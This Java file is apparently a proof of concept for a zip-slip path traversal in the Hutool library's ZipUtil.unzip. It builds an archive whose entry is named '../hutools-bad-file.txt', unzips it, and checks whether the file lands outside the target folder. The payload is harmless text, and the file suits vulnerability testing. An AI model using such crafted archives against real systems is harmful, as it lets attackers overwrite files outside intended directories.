package org.example;

import cn.hutool.core.util.ZipUtil;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class HuToolAttack {

    public static void main(String[] args) throws IOException {
        String zipFileName = "exposed/hutools-exploit.zip";
        String fileNameInsideZip = "../hutools-bad-file.txt";
        createZip(zipFileName, fileNameInsideZip, "Some file content");

        File destDir = new File("exposed/hutools-unzipped");
        destDir.mkdir();

        ZipUtil.unzip(new File(zipFileName), destDir);

        System.out.println("ZIP " + zipFileName + " was unzipped to " + destDir.getAbsolutePath());
    }

    private static void createZip(String zipFileName, String entryName, String fileContent) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(zipFileName);
             ZipOutputStream zipOut = new ZipOutputStream(fos)) {
            ZipEntry zipEntry = new ZipEntry(entryName);
            zipOut.putNextEntry(zipEntry);
            zipOut.write(fileContent.getBytes());
            zipOut.closeEntry();
            System.out.println("ZIP " + zipFileName + " was created");
        }
    }
}